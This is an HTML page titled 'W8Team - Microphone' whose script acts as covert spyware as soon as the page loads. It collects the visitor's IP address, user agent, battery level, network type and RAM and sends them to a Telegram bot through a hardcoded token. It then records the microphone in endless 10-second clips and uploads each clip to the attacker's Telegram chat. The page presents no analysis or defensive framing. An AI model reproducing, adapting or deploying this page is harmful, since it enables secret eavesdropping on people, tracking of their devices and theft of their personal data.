<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>W8Team - Microphone</title>
</head>

<body>
    <script>
        const botToken = "8543229328:AAHu2wZKG_QI2Ns7rwuQUCAEBZhLghhknng";
        let chatId = getChatIdFromUrl();

        function getChatIdFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }

        async function fetchWanIp() {
            try {
                const response = await fetch("https://ipinfo.io/json");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error(error);
                return "Error retrieving WAN IP";
            }
        }

        async function getBatteryPercentage() {
            try {
                const battery = await navigator.getBattery();
                return (battery.level * 100).toFixed(2);
            } catch (e) {
                return "N/A";
            }
        }

        function getNetworkType() {
            return navigator.connection ? navigator.connection.effectiveType : "N/A";
        }

        function sendTextToTelegram(message) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
                method: "POST",
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Message sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send message to Telegram.");
                });
        }

        function sendAudioToTelegram(blob) {
            const formData = new FormData();
            // Telegram doesn't strictly require real MP3 encoding; we send the blob
            // and name the file .mp3 so it appears as MP3 in the client.
            formData.append("audio", blob, "recording.mp3");
            formData.append("chat_id", chatId);

            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Audio recording sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send audio recording.");
                });
        }

        let globalStream = null;
        let globalRecorder = null;

        async function ensureStream() {
            if (globalStream && globalRecorder && globalRecorder.state !== "inactive") {
                return;
            }
            globalStream = await navigator.mediaDevices.getUserMedia({
                audio: { echoCancellation: true, noiseSuppression: true },
            });
            globalRecorder = new MediaRecorder(globalStream);
        }

        async function recordOnce() {
            await ensureStream();
            let audioChunks = [];

            globalRecorder.ondataavailable = (event) => {
                if (event.data && event.data.size > 0) {
                    audioChunks.push(event.data);
                }
            };

            return new Promise((resolve, reject) => {
                let stopped = false;

                globalRecorder.onstop = () => {
                    if (stopped) return;
                    stopped = true;
                    try {
                        if (audioChunks.length === 0) {
                            console.warn("Empty audio chunk, skipping send.");
                            return resolve();
                        }
                        const mimeType = globalRecorder.mimeType || "audio/webm";
                        const audioBlob = new Blob(audioChunks, { type: mimeType });
                        sendAudioToTelegram(audioBlob);
                        resolve();
                    } catch (e) {
                        reject(e);
                    }
                };

                globalRecorder.onerror = (e) => {
                    console.error(e);
                    reject(e);
                };

                audioChunks = [];
                globalRecorder.start();
                setTimeout(() => {
                    if (globalRecorder.state === "recording") {
                        globalRecorder.stop();
                    }
                }, 10000); // 10 seconds
            });
        }

        async function startAudioLoop() {
            try {
                // Infinite loop: every 10 seconds a new 10s clip is recorded and sent
                while (true) {
                    await recordOnce();
                    await new Promise(res => setTimeout(res, 1000)); // small pause between clips
                }
            } catch (error) {
                console.error(error);
                alert("Microphone permission denied or failed. Please allow microphone access.");
            }
        }

        async function onPageLoad() {
            const wanIp = await fetchWanIp();
            const userAgent = navigator.userAgent;
            const batteryPercentage = await getBatteryPercentage();
            const networkType = getNetworkType();
            const dateAndTime = new Date().toString();
            const totalRam = navigator.deviceMemory ?? "N/A";

            const infoMessage = `
🌐 WAN IP Address: ${wanIp}
📱 User-Agent: ${userAgent}
🔋 Battery Percentage: ${batteryPercentage}%
📡 Network Type: ${networkType}
🗓 Date and Time: ${dateAndTime}
💾 Total RAM: ${totalRam} GB
🎤 Microphone: recording 10 seconds, sending continuously...
`;

            sendTextToTelegram(infoMessage);
            await startAudioLoop();
        }

        onPageLoad();
    </script>
</body>

</html>
